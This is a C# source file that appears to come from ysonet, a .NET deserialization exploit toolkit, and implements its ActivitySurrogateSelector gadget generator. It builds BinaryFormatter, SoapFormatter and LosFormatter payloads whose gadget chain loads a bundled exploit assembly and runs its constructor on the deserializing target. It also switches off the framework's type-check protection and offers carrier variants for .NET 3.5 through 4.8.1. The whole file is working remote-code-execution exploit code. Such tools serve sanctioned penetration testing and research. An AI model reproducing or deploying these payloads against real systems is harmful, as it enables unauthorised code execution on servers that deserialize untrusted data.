using NDesk.Options;
using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel.Design;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.Serialization;
using System.Web.UI.WebControls;
using ysonet.Helpers;

namespace ysonet.Generators
{
    public class MySurrogateSelector : SurrogateSelector
    {
        private const string LegacySystemCoreIdentity =
            "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";

        private readonly bool targetClr2;

        public MySurrogateSelector(bool targetClr2 = false)
        {
            this.targetClr2 = targetClr2;
        }

        public override ISerializationSurrogate GetSurrogate(Type type, StreamingContext context, out ISurrogateSelector selector)
        {
            selector = this;
            // ysonet runs on CLR 4, where Func<> lives in mscorlib. On CLR 2 the same
            // delegate lives in System.Core 3.5. The ordinary --legacyfx transform changes
            // assembly VERSIONS only, so it cannot express this one assembly relocation.
            // Author the DelegateSerializationHolder entry correctly while the inner stream
            // is being built. Everything else remains the real delegate graph produced by
            // the runtime.
            if (targetClr2 && typeof(Delegate).IsAssignableFrom(type)
                && type.FullName != null
                && type.FullName.StartsWith("System.Func`", StringComparison.Ordinal))
                return LegacyFuncDelegateSurrogate.Instance;

            if (!type.IsSerializable)
            {
                Type t = Type.GetType("System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+ObjectSurrogate, System.Workflow.ComponentModel, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35");
                return (ISerializationSurrogate)Activator.CreateInstance(t);
            }

            return base.GetSurrogate(type, context, out selector);
        }

        /// <summary>
        /// Delegate.GetObjectData already writes the complete, readable holder graph. This
        /// surrogate changes only the holder entry's root delegate assembly from CLR 4's
        /// mscorlib to CLR 2's System.Core. The target never sees this surrogate type: the
        /// SerializationInfo names System.DelegateSerializationHolder exactly as the normal
        /// delegate serializer does.
        /// </summary>
        private sealed class LegacyFuncDelegateSurrogate : ISerializationSurrogate
        {
            internal static readonly LegacyFuncDelegateSurrogate Instance =
                new LegacyFuncDelegateSurrogate();

            private LegacyFuncDelegateSurrogate()
            {
            }

            public void GetObjectData(object obj, SerializationInfo info, StreamingContext context)
            {
                ISerializable serializable = obj as ISerializable;
                if (serializable == null)
                    throw new SerializationException("The CLR-v2 ActivitySurrogate delegate is not ISerializable.");

                serializable.GetObjectData(info, context);

                object entry = info.GetValue("Delegate", typeof(object));
                int changed = 0;
                while (entry != null)
                {
                    Type entryType = entry.GetType();
                    FieldInfo typeField = entryType.GetField("type",
                        BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
                    FieldInfo assemblyField = entryType.GetField("assembly",
                        BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
                    FieldInfo nextField = entryType.GetField("delegateEntry",
                        BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
                    if (typeField == null || assemblyField == null || nextField == null)
                        throw new SerializationException(
                            "The runtime DelegateEntry shape is not the one ActivitySurrogateSelector expects.");

                    string delegateType = typeField.GetValue(entry) as string;
                    if (delegateType != null
                        && delegateType.StartsWith("System.Func`", StringComparison.Ordinal))
                    {
                        assemblyField.SetValue(entry, LegacySystemCoreIdentity);
                        changed++;
                    }
                    entry = nextField.GetValue(entry);
                }

                if (changed == 0)
                    throw new SerializationException(
                        "The CLR-v2 ActivitySurrogate delegate holder contained no Func entry.");
            }

            public object SetObjectData(object obj, SerializationInfo info,
                StreamingContext context, ISurrogateSelector selector)
            {
                throw new NotSupportedException(
                    "The generation-only CLR-v2 delegate surrogate is never used to deserialize.");
            }
        }

    }

    [Serializable]
    public class PayloadClass : ISerializable
    {
        protected byte[] assemblyBytes;
        protected int variant_number = 1;
        protected InputArgs inputArgs = new InputArgs();
        public PayloadClass() { }
        public PayloadClass(int variant_number, InputArgs inputArgs)
        {
            this.variant_number = variant_number;
            this.inputArgs = inputArgs;
            string binDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            if (inputArgs != null && inputArgs.LegacyFx)
            {
                // E.dll is a 4.7.2 build and CLR 2 refuses it before its constructor can run.
                // The same readable ExploitClass.cs is copied beside ysonet.exe, so compile
                // that source with the v3.5 compiler when the payload targets CLR 2.
                this.assemblyBytes = LocalCodeCompiler.GetAsmBytes(
                    Path.Combine(binDirectory, "ExploitClass.cs") + ";System.dll", true);
            }
            else
            {
                this.assemblyBytes = File.ReadAllBytes(Path.Combine(binDirectory, "e.dll"));
            }
        }
        private IEnumerable<TResult> CreateWhereSelectEnumerableIterator<TSource, TResult>(IEnumerable<TSource> src, Func<TSource, bool> predicate, Func<TSource, TResult> selector)
        {
            Type t = Assembly.Load("System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089")
              .GetType("System.Linq.Enumerable+WhereSelectEnumerableIterator`2")
              .MakeGenericType(typeof(TSource), typeof(TResult));
            return t.GetConstructors()[0].Invoke(new object[] { src, predicate, selector }) as IEnumerable<TResult>;
        }
        protected PayloadClass(SerializationInfo info, StreamingContext context)
        {
        }

        public List<object> GadgetChains()
        {
            DesignerVerb verb = null;
            Hashtable ht = null;
            List<object> ls = null;
            //variant 2, old technique
            if (this.variant_number == 2)
            {
                // Build a chain to map a byte array to creating an instance of a class.
                // byte[] -> Assembly.Load -> Assembly -> Assembly.GetType -> Type[] -> Activator.CreateInstance -> Win!
                List<byte[]> data = new List<byte[]>();
                data.Add(this.assemblyBytes);
                var e1 = data.Select(Assembly.Load);
                Func<Assembly, IEnumerable<Type>> map_type = (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"));
                var e2 = e1.SelectMany(map_type);
                var e3 = e2.Select(Activator.CreateInstance);

                // PagedDataSource maps an arbitrary IEnumerable to an ICollection
                PagedDataSource pds = new PagedDataSource() { DataSource = e3 };
                // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
                // Class is internal so need to use reflection.
                IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);

                // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
                verb = new DesignerVerb("", null);
                // Need to insert IDictionary using reflection.
                typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);

                // Pre-load objects, this ensures they're fixed up before building the hash table.
                ls = new List<object>();
                ls.Add(e1);
                ls.Add(e2);
                ls.Add(e3);
                ls.Add(pds);
                ls.Add(verb);
                ls.Add(dict);
            }
            //Default, use compatible mode.
            //Old technique contains a compiler-generated class [System.Core]System.Linq.Enumerable+<SelectManyIterator>d__[Compiler_Generated_Class_SEQ]`2,
            //the Compiler_Generated_Class_SEQ may NOT same in different version of .net framework. 
            //For example, in .net framework 4.6 was 16,and 17 in .net framework 4.7.
            //New technique use [System.Core]System.Linq.Enumerable+WhereSelectEnumerableIterator`2 only to fix it.
            //It make compatible from v3.5 to lastest(needs to using v3.5 compiler, and may also need to call disable type check first if target runtime was v4.8+).
            //Execution chain: Assembly.Load(byte[]).GetTypes().GetEnumerator().{MoveNext(),get_Current()} -> Activator.CreateInstance() -> Win!
            else
            {
                byte[][] e1 = new byte[][] { assemblyBytes };
                IEnumerable<Assembly> e2 = CreateWhereSelectEnumerableIterator<byte[], Assembly>(e1, null, Assembly.Load);
                IEnumerable<IEnumerable<Type>> e3 = CreateWhereSelectEnumerableIterator<Assembly, IEnumerable<Type>>(e2,
                    null,
                    (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate
                        (
                            typeof(Func<Assembly, IEnumerable<Type>>),
                            typeof(Assembly).GetMethod("GetTypes")
                        )
                );
                IEnumerable<IEnumerator<Type>> e4 = CreateWhereSelectEnumerableIterator<IEnumerable<Type>, IEnumerator<Type>>(e3,
                    null,
                    (Func<IEnumerable<Type>, IEnumerator<Type>>)Delegate.CreateDelegate
                    (
                        typeof(Func<IEnumerable<Type>, IEnumerator<Type>>),
                        typeof(IEnumerable<Type>).GetMethod("GetEnumerator")
                    )
                );
                //bool MoveNext(this) => Func<IEnumerator<Type>,bool> => predicate
                //Type get_Current(this) => Func<IEnumerator<Type>,Type> => selector
                //
                //WhereSelectEnumerableIterator`2.MoveNext => 
                //  if(predicate(IEnumerator<Type>)) {selector(IEnumerator<Type>);} =>
                //  IEnumerator<Type>.MoveNext();return IEnumerator<Type>.Current;
                IEnumerable<Type> e5 = CreateWhereSelectEnumerableIterator<IEnumerator<Type>, Type>(e4,
                    (Func<IEnumerator<Type>, bool>)Delegate.CreateDelegate
                    (
                        typeof(Func<IEnumerator<Type>, bool>),
                        typeof(IEnumerator).GetMethod("MoveNext")
                    ),
                    (Func<IEnumerator<Type>, Type>)Delegate.CreateDelegate
                    (
                        typeof(Func<IEnumerator<Type>, Type>),
                        typeof(IEnumerator<Type>).GetProperty("Current").GetGetMethod()
                    )
                );
                IEnumerable<object> end = CreateWhereSelectEnumerableIterator<Type, object>(e5, null, Activator.CreateInstance);
                // PagedDataSource maps an arbitrary IEnumerable to an ICollection
                PagedDataSource pds = new PagedDataSource() { DataSource = end };
                // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
                // Class is internal so need to use reflection.
                IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);

                // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
                verb = new DesignerVerb("", null);
                // Need to insert IDictionary using reflection.
                typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);

                // Pre-load objects, this ensures they're fixed up before building the hash table.
                ls = new List<object>();
                ls.Add(e1);
                ls.Add(e2);
                ls.Add(e3);
                ls.Add(e4);
                ls.Add(e5);
                ls.Add(end);
                ls.Add(pds);
                ls.Add(verb);
                ls.Add(dict);
            }
            ht = new Hashtable();

            // Add two entries to table.
            /*
            ht.Add(verb, "Hello");
            ht.Add("Dummy", "Hello2");
            */
            ht.Add(verb, "");
            ht.Add("", "");

            FieldInfo fi_keys = ht.GetType().GetField("buckets", BindingFlags.NonPublic | BindingFlags.Instance);
            Array keys = (Array)fi_keys.GetValue(ht);
            FieldInfo fi_key = keys.GetType().GetElementType().GetField("key", BindingFlags.Public | BindingFlags.Instance);
            for (int i = 0; i < keys.Length; ++i)
            {
                object bucket = keys.GetValue(i);
                object key = fi_key.GetValue(bucket);
                if (key is string)
                {
                    fi_key.SetValue(bucket, verb);
                    keys.SetValue(bucket, i);
                    break;
                }
            }

            fi_keys.SetValue(ht, keys);

            ls.Add(ht);

            return ls;
        }

        public byte[] GadgetChainsToBinaryFormatter()
        {
            List<object> ls = GadgetChains();

            // The ROOT CARRIER that receives these bytes is chosen in GetObjectData below:
            // AxHost.State (variants 1 and 2, the shorter payload) or DataSet (variant 3).
            // Both carry the identical chain, so this method does not need to know which.
            MemoryStream stm = new MemoryStream();

            if (inputArgs.Minify)
            {
                ysonet.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter fmtLocal = new ysonet.Helpers.ModifiedVulnerableBinaryFormatters.BinaryFormatter();
                fmtLocal.SurrogateSelector = new MySurrogateSelector(
                    inputArgs != null && inputArgs.LegacyFx);
                fmtLocal.Serialize(stm, ls);
            }
            else
            {
                System.Runtime.Serialization.Formatters.Binary.BinaryFormatter fmt = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                fmt.SurrogateSelector = new MySurrogateSelector(
                    inputArgs != null && inputArgs.LegacyFx);
                fmt.Serialize(stm, ls);
            }

            // This whole chain is embedded in the outer document as an OPAQUE byte[]
            // (AxHost.State's PropertyBagBinary below), so the shared generation boundary
            // never sees it: the outer walker reads a byte array and steps over it. Every
            // type in the real gadget chain lives in HERE, so without this call --legacyfx
            // rewrote one identity in the outer layer and left forty 4.0.0.0 names in the
            // payload that actually runs - which looks like a working rewrite right up until
            // the target refuses to bind mscorlib 4.0.0.0 and AxHost.State swallows it.
            //
            // The layer is a BinaryFormatter stream, so it is rewritten AS one, by the same
            // helper the boundary uses. The mechanics stay in the helper; only the decision
            // to rewrite this layer belongs to this gadget, because only this gadget knows it
            // embedded one.
            byte[] inner = stm.ToArray();
            LegacyFrameworkIdentities.RewriteReport innerReport;
            inner = (byte[])LegacyFrameworkIdentities.Apply(inner, Formatters.BinaryFormatter,
                inputArgs, out innerReport);
            return inner;
        }

        /// <summary>
        /// Choose the ROOT CARRIER that smuggles the chain.
        ///
        /// AxHost.State (variants 1 and 2) is the shorter document - it saves around 404
        /// characters over DataSet - and it is what this project shipped for years. It does
        /// unpack this gadget's inner stream on CLR v2; the apparent historical no-fire was its
        /// swallowing of the inner Func&lt;&gt; assembly-bind failure.
        ///
        /// DataSet (variant 3) is the carrier ysoserial.net's .NET 3.5 build used, and a DataSet
        /// with RemotingFormat=Binary also unpacks DataSet.Tables_0 on CLR v2. It remains an
        /// explicit, larger alternative for compatibility with that historical shape.
        ///
        /// The member NAMES and their ORDER below are the shape DataSet's own serialization
        /// constructor reads. Tables.Count must precede Tables_0, and the LCID is the invariant
        /// 0x409 the original used; changing either silently produces a DataSet that builds and
        /// carries nothing.
        /// </summary>
        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            System.Diagnostics.Trace.WriteLine("In GetObjectData");
            byte[] chain = GadgetChainsToBinaryFormatter();

            if (this.variant_number == 3)
            {
                info.SetType(typeof(System.Data.DataSet));
                info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
                info.AddValue("DataSet.DataSetName", "");
                info.AddValue("DataSet.Namespace", "");
                info.AddValue("DataSet.Prefix", "");
                info.AddValue("DataSet.CaseSensitive", false);
                info.AddValue("DataSet.LocaleLCID", 0x409);
                info.AddValue("DataSet.EnforceConstraints", false);
                info.AddValue("DataSet.ExtendedProperties", (System.Data.PropertyCollection)null);
                info.AddValue("DataSet.Tables.Count", 1);
                info.AddValue("DataSet.Tables_0", chain);
                return;
            }

            info.SetType(typeof(System.Windows.Forms.AxHost.State));
            info.AddValue("PropertyBagBinary", chain);
        }
    }

    public class ActivitySurrogateSelectorGenerator : GenericGenerator
    {
        // Discovery facets (category search only): loads and runs the bundled exploit
        // assembly (Assembly.Load + Activator.CreateInstance) via framework built-in
        // types. Both variants share this. ActivitySurrogateSelectorFromFile
        // subclasses this and inherits these facets; it only changes the input
        // (CsSourceFile), which derives to source-code-file automatically.
        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                // The source-file subclass executes a measured sample on CLR 2 / .NET 3.5
                // when --legacyfx authors its CLR-v2-only identities.
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx35, RuntimeVersion.NetFx481));
        }

        private int variant_number = 1;

        public override OptionSet Options()
        {
            OptionSet options = new OptionSet()
            {
                {"var|variant=", "Payload variant number where applicable. Choices: 1 (default), 2 (shorter but may not work between versions), 3 (larger DataSet carrier)", v => int.TryParse(v, out this.variant_number) },
            }
            .WithMetadata("variant", OptionMetadata.ForVariants(Variants()));
            return options;
        }
        public override string AdditionalInfo()
        {
            return "This gadget ignores the command parameter and executes the constructor of the bundled ExploitClass class. For a .NET Framework 3.5 target, use --legacyfx with the default variant or variant 3; ysonet compiles the bundled ExploitClass.cs with the CLR-v2 compiler and writes Func delegates against System.Core 3.5. Variant 2 remains 4.x-only; variant 3 selects the larger DataSet carrier.";
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.Ignored;
        }

        public override List<GadgetVariant> Variants()
        {
            return new List<GadgetVariant>
            {
                new GadgetVariant(1, "new enumerator chain (version-compatible, default)"),
                // The older chain still deserializes without an effect on .NET 3.5, so it
                // retains the project's measured 4.x range while variants 1 and 3 inherit
                // the lowered 3.5 floor.
                new GadgetVariant(2, "old chain (shorter, may not work across versions)")
                    .WithFacets(new GadgetFacetSet()
                        .WithKinds(PayloadKind.CodeExecution)
                        .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                        .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481))),
                // Variant 3 is variant 1's chain in the DataSet root carrier instead of
                // AxHost.State. This is the shape ysoserial.net's 3.5 build used and remains
                // available as an explicit compatibility alternative.
                new GadgetVariant(3, "DataSet root carrier (larger compatibility alternative)")
            };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter (3)", "SoapFormatter (3)", "LosFormatter (3)" };
        }

        public override string Finders()
        {
            return "James Forshaw";
        }

        public override string Contributors()
        {
            return "Alvaro Munoz, zcgonvh"; // Actually Alvaro Muñoz but powershell clipboard can't take ñ sadly!
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            // Disable ActivitySurrogate type protections during generation
            System.Configuration.ConfigurationManager.AppSettings.Set("microsoft:WorkflowComponentModel:DisableActivitySurrogateSelectorTypeCheck", "true");

            PayloadClass payload = new PayloadClass(variant_number, inputArgs);
            if (inputArgs.Minify)
            {
                // This branch builds the minified stream itself, so it goes through the shared
                // finisher with alreadyMinified: that is where the whole-payload generation
                // boundary runs (--legacyfx today) and where the self-test reads the FINAL
                // bytes. Returning here directly used to skip both.
                byte[] payloadInByte = payload.GadgetChainsToBinaryFormatter();
                if (formatter.ToLower().Equals("binaryformatter"))
                {
                    return FinishHandWrittenPayload(payloadInByte, formatter, inputArgs, null, true);
                }
                else if (formatter.ToLower().Equals("losformatter"))
                {
                    payloadInByte = Helpers.ModifiedVulnerableBinaryFormatters.SimpleMinifiedObjectLosFormatter.BFStreamToLosFormatterStream(payload.GadgetChainsToBinaryFormatter());
                    return FinishHandWrittenPayload(payloadInByte, formatter, inputArgs, null, true);
                }
            }

            return Serialize(payload, formatter, inputArgs);
        }

    }
}
